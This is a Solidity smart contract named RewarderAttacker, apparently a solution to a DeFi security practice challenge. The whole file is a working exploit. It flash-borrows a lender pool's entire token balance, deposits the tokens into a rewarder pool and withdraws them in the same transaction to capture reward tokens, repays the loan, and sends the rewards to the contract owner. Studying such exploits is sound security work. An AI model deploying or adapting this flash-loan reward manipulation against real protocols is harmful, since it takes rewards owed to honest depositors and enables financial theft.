// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface LoanerPool {
    function flashLoan(uint256) external;
}

interface RewarderPool {
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function rewardToken() external returns(Token);
}

interface Token {
    function balanceOf(address) external returns(uint256);
    function transfer(address, uint256) external;
    function approve(address, uint256) external;
}


contract RewarderAttacker {
    LoanerPool public loanerPool;
    RewarderPool public rewarderPool;

    Token public accToken;
    Token public rewardToken;

    address public owner;

    constructor(
        address _loanerPool, 
        address _rewarderPool, 
        address _accToken,
        address _rewardToken
    ) {
        require(_loanerPool != address(0), "invalid loanerPool address");
        require(_rewarderPool != address(0), "invalid rewarderPool address");
        require(_accToken != address(0), "invalid accToken address");
        require(_rewardToken != address(0), "invalid rewardToken address");

        loanerPool = LoanerPool(_loanerPool);
        rewarderPool = RewarderPool(_rewarderPool);

        accToken = Token(_accToken);
        rewardToken = Token(_rewardToken);

        owner = msg.sender;
    }
    
    function attack() external {
        require(msg.sender == owner, "caller is not owner");

        uint256 loanAmount = accToken.balanceOf(address(loanerPool));
        loanerPool.flashLoan(loanAmount);

        uint256 rewardAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, rewardAmount);
    }

    function receiveFlashLoan(uint256 amount) external {
        accToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        accToken.transfer(address(loanerPool), amount);
    }
}
